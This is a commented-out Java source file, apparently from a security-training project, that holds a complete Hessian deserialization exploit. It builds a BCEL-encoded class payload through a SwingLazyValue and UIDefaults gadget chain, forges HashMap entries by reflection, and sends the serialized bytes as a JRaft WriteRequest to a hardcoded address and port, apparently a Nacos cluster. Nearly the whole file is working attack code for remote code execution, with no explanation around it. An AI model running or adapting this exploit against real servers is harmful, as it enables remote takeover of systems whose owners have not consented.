//package com.madaha.codesecone.controller.AdvancedAttack.deserialize.HessianDeserialize;
//
//import com.alipay.sofa.jraft.entity.PeerId;
//import com.alipay.sofa.jraft.option.CliOptions;
//import com.alipay.sofa.jraft.rpc.impl.GrpcClient;
//import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
//import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
//import com.caucho.hessian.io.Hessian2Output;
//import com.caucho.hessian.io.SerializerFactory;
//import com.google.protobuf.*;
//import com.sun.org.apache.bcel.internal.Repository;
//import com.sun.org.apache.bcel.internal.classfile.JavaClass;
//import com.sun.org.apache.bcel.internal.classfile.Utility;
//import sun.swing.SwingLazyValue;
//
//import javax.swing.*;
//import java.io.ByteArrayOutputStream;
//import java.lang.reflect.Array;
//import java.lang.reflect.Constructor;
//import java.lang.reflect.Field;
//import java.util.HashMap;
//import java.util.Map;
//
//
//
//public class HessionEXP {
//
//    public static void main( String[] args ) throws Exception {
//        String address = "192.168.111.178:7848";
//        byte[] poc = build();
//
//        //初始化 RPC 服务
//        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
//        cliClientService.init(new CliOptions());
//        PeerId leader = PeerId.parsePeer(address);
//
//        WriteRequest request = WriteRequest.newBuilder()
//                .setGroup("naming_persistent_service_v2")
//                .setData(ByteString.copyFrom(poc))
//                .build();
//
//        GrpcClient grpcClient = (GrpcClient) cliClientService.getRpcClient();
//
//        //反射添加WriteRequest，不然会抛出异常
//        Field parserClassesField = GrpcClient.class.getDeclaredField("parserClasses");
//        parserClassesField.setAccessible(true);
//        Map<String, Message> parserClasses = (Map) parserClassesField.get(grpcClient);
//        parserClasses.put(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());
//        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());
//
//        Object res = grpcClient.invokeSync(leader.getEndpoint(), request,5000);
//        System.out.println(res);
//    }
//
//    private static byte[] build() throws Exception {
//        JavaClass evil = Repository.lookupClass(calc.class);
//        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);
//
//        SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}});
//        UIDefaults uiDefaults1 = new UIDefaults();
//        uiDefaults1.put("_", slz);
//        UIDefaults uiDefaults2 = new UIDefaults();
//        uiDefaults2.put("_", slz);
//
//        HashMap hashMap = makeMap(uiDefaults1,uiDefaults2);
//
//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        Hessian2Output oo = new Hessian2Output(baos);
//        oo.setSerializerFactory(new SerializerFactory());
//        oo.getSerializerFactory().setAllowNonSerializable(true);
//        oo.writeObject(hashMap);
//        oo.flush();
//
//        return baos.toByteArray();
//    }
//
//    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
//        HashMap<Object, Object> s = new HashMap<>();
//        setFieldValue(s, "size", 2);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        } catch (ClassNotFoundException e) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        Object tbl = Array.newInstance(nodeC, 2);
//        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
//        setFieldValue(s, "table", tbl);
//        return s;
//    }
//    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
//        Field field = obj.getClass().getDeclaredField(name);
//        field.setAccessible(true);
//        field.set(obj, value);
//    }
//}